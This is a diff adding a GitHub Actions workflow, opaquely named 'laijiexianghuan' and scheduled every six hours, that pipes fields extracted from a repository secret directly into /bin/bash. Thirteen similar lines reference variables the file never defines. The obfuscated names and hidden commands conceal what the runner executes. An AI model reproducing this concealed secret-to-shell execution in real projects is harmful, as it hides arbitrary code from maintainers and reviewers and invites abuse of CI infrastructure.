@@ -1,0 +1,30 @@
+name: laijiexianghuan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laijiexianghuan
+        env:
+          wb8700: ${{ secrets.wb8700 }}
+        run: |
+          echo $wb8700 | jq -r .tx50105 | /bin/bash
+          echo $ldv7 | jq -r .dxqi71104 | /bin/bash
+          echo $kzjo1 | jq -r .new679 | /bin/bash
+          echo $yjlz195 | jq -r .nkk37 | /bin/bash
+          echo $bxu2701 | jq -r .ps06 | /bin/bash
+          echo $yg10808 | jq -r .t455 | /bin/bash
+          echo $lwr27853 | jq -r .avag64 | /bin/bash
+          echo $otxf51 | jq -r .u0 | /bin/bash
+          echo $x92 | jq -r .ngomc4 | /bin/bash
+          echo $z72471 | jq -r .nhvi639 | /bin/bash
+          echo $nfizy75 | jq -r .musul05 | /bin/bash
+          echo $tqpui6093 | jq -r .v80 | /bin/bash
+          echo $tojg9245 | jq -r .ny0 | /bin/bash
+          echo $rmog0409 | jq -r .vqtr1 | /bin/bash
+
